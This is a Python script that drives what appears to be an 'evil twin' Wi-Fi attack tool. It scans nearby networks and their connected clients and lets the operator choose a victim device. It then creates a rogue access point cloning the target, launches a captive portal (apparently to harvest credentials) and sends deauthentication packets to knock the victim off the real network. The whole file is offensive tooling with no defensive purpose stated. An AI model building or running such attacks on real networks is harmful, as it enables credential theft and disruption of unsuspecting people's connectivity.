import time, sys
import scan, attack
from threading import Thread


def display_networks():
    print("\nDiscovered Networks (with client counts):")
    print(f"{'Index':<6}{'BSSID':<20}{'SSID':<30}{'Signal':<8}{'Channel':<8}{'Sec':<10}{'Clients'}")
    networks = scan.get_networks()
    for idx, (bssid, det) in enumerate(networks.items()):
        count = len(scan.get_clients(bssid))
        print(f"{idx:<6}{bssid:<20}{det['SSID']:<30}{det['Signal']:<8}{det['Channel']:<8}{det['Security']:<10}{count}")


def display_clients(bssid):
    print(f"\nClients for BSSID {bssid}:")
    print(f"{'Index':<6}{'MAC':<20}{'Packets':<10}{'Last Seen'}")
    clients = scan.get_clients(bssid)
    for idx, (mac, info) in enumerate(clients.items()):
        print(f"{idx:<6}{mac:<20}{info['pkt_count']:<10}{info['last_seen']}")


def main():
    iface = scan.select_interface()
    print(f"Starting sniffing on {iface}...")
    sniffer = scan.start_sniff(iface)

    # Warm-up phase: 60 seconds
    warmup = 5
    print(f"Gathering data for {warmup}s before menu...")
    time.sleep(warmup)

    try:
        while True:
            display_networks()
            nets = scan.get_networks()
            choice = input("Select network index, 'r' to refresh, 'q' to quit: ").strip().lower()
            if choice == 'q':
                scan.stop_sniff.set()
                sniffer.join()
                sys.exit(0)
            if choice == 'r':
                refresh = 5
                print(f"Refreshing data for {refresh}s...")
                time.sleep(refresh)
                continue
            if not choice.isdigit() or int(choice) not in range(len(nets)):
                print("Invalid choice.")
                continue

            idx = int(choice)
            bssid = list(nets.keys())[idx]
            ap_info = nets[bssid]

            while True:
                display_clients(bssid)
                clients = scan.get_clients(bssid)
                sub = input("Select client index, 'b' to go back, 'q' to quit: ").strip().lower()
                if sub == 'q':
                    scan.stop_sniff.set()
                    sniffer.join()
                    sys.exit(0)
                if sub == 'b':
                    break
                if not sub.isdigit() or int(sub) not in range(len(clients)):
                    print("Invalid choice.")
                    continue

                client_mac = list(clients.keys())[int(sub)]
                print(f"\nSelected AP: {ap_info['SSID']} ({bssid})")
                print(f"Selected Client: {client_mac}, Packets: {clients[client_mac]['pkt_count']}, Last Seen: {clients[client_mac]['last_seen']}")

                # Start the attack
                attack.create_evil_ap(ap_info, iface)

                # Launch captive portal in background
                portal_thread = Thread(target=attack.start_captive_portal, daemon=True)
                portal_thread.start()

                attack.deauth_victim({'BSSID': bssid}, client_mac, iface)

                # Stop packet sniffing (we don't need it now)
                scan.stop_sniff.set()
                sniffer.join()

                # Keep the main thread alive to serve portal
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print("Shutting down captive portal.")
                    sys.exit(0)
    except KeyboardInterrupt:
        pass
    finally:
        scan.stop_sniff.set()
        sniffer.join()
        print("Exiting.")

if __name__ == '__main__':
    main()
